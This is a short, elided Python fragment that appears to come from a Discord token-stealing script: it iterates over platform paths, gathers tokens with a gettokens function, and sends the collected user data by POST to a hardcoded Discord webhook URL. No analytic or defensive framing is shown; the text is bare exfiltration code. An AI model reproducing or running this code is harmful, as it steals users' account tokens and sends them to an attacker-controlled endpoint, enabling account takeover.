    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            try:
                ...
                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1367209623328784424/h-G5wGq9z_yu-xmBjmJjC6WWUVlywzv5C74aBDN-mWEfBYREP-fXPLKGophAYO3hdln4', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
